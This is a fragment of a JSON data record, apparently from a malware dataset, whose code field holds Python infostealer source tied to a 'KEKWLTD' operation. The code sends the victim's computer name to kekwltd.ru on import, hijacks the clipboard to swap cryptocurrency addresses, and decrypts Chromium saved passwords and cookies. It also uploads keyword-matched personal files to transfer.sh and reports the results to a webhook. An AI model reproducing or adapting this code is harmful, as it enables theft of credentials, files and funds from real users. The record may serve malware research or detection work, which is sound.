      "contextual_code": "import os\nimport requests\nimport httpx\nimport threading\nimport shutil\nimport sqlite3\nimport base64\nimport json\nimport re\nimport pyperclip\nfrom Crypto.Cipher import AES\n\n# --- Initial exfiltration on import ---\ndata = {\n        'embeds': [{\n            \"title\": \"Someone Tried to download\",\n            \"description\": \"PC Username =\" + os.getenv(\"COMPUTERNAME\")\n            }]\n    }\nhttpx.post(\"https://kekwltd.ru/relay/bluescreen\", json=data)\n\n# --- Crypto wallet address swapper (clipboard hijacker) ---\nclass auto_copy_wallet:\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            if re.search('^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_xchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_xchain)\n                        pyperclip.paste()\n            if re.search('^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_pchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_pchain)\n                        pyperclip.paste()\n            if re.search('^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_cchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_cchain)\n                        pyperclip.paste()\n            if re.search('addr1[a-z0-9]+', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    pyperclip.copy(self.address_ada)\n                    pyperclip.paste()\n            if re.search('/X[1-9A-HJ-NP-Za-km-z]{33}$/g', clipboard_data):\n                if self.address_dash != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_dash)\n                        pyperclip.paste()\n            if re.search('/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g', clipboard_data):\n                if self.address_monero != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_monero)\n                        pyperclip.paste()\n        except:\n            data = None\n\ndef upload(name, tk=''):\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n    hook = fetch_conf(\"yourwebhookurl\")\n    if name == \"bc_checking\":\n        data = {\n        \"content\": '',\n        \"embeds\": [\n            {\n            \"fields\": [\n                {\n                \"name\": \"Interesting files found on user PC:\",\n                \"value\": tk\n                }\n            ],\n            \"author\": {\n                'name': f'KEKWLTD v2.3',\n                'url': 'https://kekwltd.ru',\n                'icon_url': 'https://cdn.discordapp.com/avatars/228549113581535235/430f81ead67eaffcaffbb6e7b0af2927.png'\n            },\n            \"footer\": {\n                \"text\": \"kekwltd.ru\"\n            },\n            'color': 374276,\n            }\n        ],\n        \"avatar_url\": \"https://cdn.discordapp.com/avatars/228549113581535235/430f81ead67eaffcaffbb6e7b0af2927.png\",\n        \"attachments\": []\n        }\n        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)\n        return\n    path = name\n    files = {'file': open(path, 'rb')}\n    LoadRequests(\"POST\", hook, files=files)\n\n# --- Password/cookie stealer for Chromium browsers ---\ndef getPassw(path, arg):\n    if not os.path.exists(path): return\n    pathC = path + arg + \"/Login Data\"\n    if os.stat(pathC).st_size == 0: return\n    tempfold = temp + \"kekwltd\" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + \".db\"\n    shutil.copy2(pathC, tempfold)\n    conn = sqlite3.connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT action_url, username_value, password_value FROM logins;\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey = path + \"/Local State\"\n    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json.loads(f.read())\n    master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key = CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0] != '':\n            Passw.append(f\"URL: {row[0]} \\n ID: {row[1]} \\n PASSW0RD: {DecryptValue(row[2], master_key)}\\n\\n\")\n    writeforfile(Passw, 'bc_allpasswords')\n\ndef getCookie(path, arg):\n    if not os.path.exists(path): return\n    pathC = path + arg + \"/Cookies\"\n    if os.stat(pathC).st_size == 0: return\n    tempfold = temp + \"kekwltd\" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + \".db\"\n    shutil.copy2(pathC, tempfold)\n    conn = sqlite3.connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT host_key, name, encrypted_value FROM cookies\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey = path + \"/Local State\"\n    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json.loads(f.read())\n    master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key = CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0] != '':\n            Cookies.append(f\"{row[0]}\\tTRUE\\t\\t/FALSE\\t2597573456\\t{row[1]}\\t{DecryptValue(row[2], master_key)}\")\n    writeforfile(Cookies, 'bc_allcookies')\n\n# --- File search and exfiltration from Desktop/Documents/Downloads ---\ndef bc_uploadanonfiles(path):\n    try:\n        files = { \"file\": (path, open(path, mode='rb')) }\n        upload = requests.post(\"https://transfer.sh/\", files=files)\n        url = upload.text\n        return url\n    except:\n        return False\n\ndef bc_Folder_create(pathF, keywords):\n    maxfilesperdir = 7\n    i = 0\n    listOfFile = os.listdir(pathF)\n    ffound = []\n    for file in listOfFile:\n        if not os.path.isfile(pathF + \"/\" + file): return\n        i += 1\n        if i <= maxfilesperdir:\n            url = bc_uploadanonfiles(pathF + \"/\" + file)\n            ffound.append([pathF + \"/\" + file, url])\n        else:\n            break\n    bc_create_files.append([\"folder\", pathF + \"/\", ffound])\n\ndef bc_create_file(path, keywords):\n    fifound = []\n    listOfFile = os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path + \"/\" + file) and \".txt\" in file:\n                    fifound.append([path + \"/\" + file, bc_uploadanonfiles(path + \"/\" + file)])\n                    break\n                if os.path.isdir(path + \"/\" + file):\n                    target = path + \"/\" + file\n                    bc_Folder_create(target, keywords)\n                    break\n    bc_create_files.append([\"folder\", path, fifound])\n\ndef bc_checking():\n    user = temp.split(\"\\AppData\")[0]\n    path2search = [\n        user + \"/Desktop\",\n        user + \"/Downloads\",\n        user + \"/Documents\"\n    ]\n    key_wordsFiles = [\n        \"passw\", \"mdp\", \"motdepasse\", \"mot_de_passe\", \"login\", \"secret\", \"account\", \"acount\", \"paypal\", \"banque\", \"metamask\", \"wallet\", \"crypto\", \"exodus\", \"discord\", \"2fa\", \"code\", \"memo\", \"compte\", \"token\", \"backup\", \"seecret\"\n    ]\n    wikith = []\n    for patt in path2search:\n        bc_checking = threading.Thread(target=bc_create_file, args=[patt, key_wordsFiles]);bc_checking.start()\n        wikith.append(bc_checking)\n    return wikith\n\ngrabber_thread = threading.Thread(target=auto_copy_wallet().run)\ngrabber_thread.start()\n\ngrab_GatherAll = True\nif grab_GatherAll:\n    grabb_GatherAll()\n    DETECTED = False # Trust(Cookies) is called in grabb_GatherAll\n    if not DETECTED:\n        wikith = bc_checking()\n        for thread in wikith: thread.join()\n        time.sleep(0.2)\n        filetext = \"```diff\\n\"\n        for arg in bc_create_files:\n            if len(arg[2]) != 0:\n                foldpath = arg[1]\n                foldlist = arg[2]\n                filetext +=f\"\\n\"\n                filetext += f\"- {foldpath}\\n\"\n                for ffil in foldlist:\n                    a = ffil[0].split(\"/\")\n                    fileanme = a[len(a)-1]\n                    b = ffil[1]\n                    filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                    filetext += \"\\n\"\n        filetext += \"\\n```\"\n        upload(\"bc_checking\", filetext)"
    }
  }
]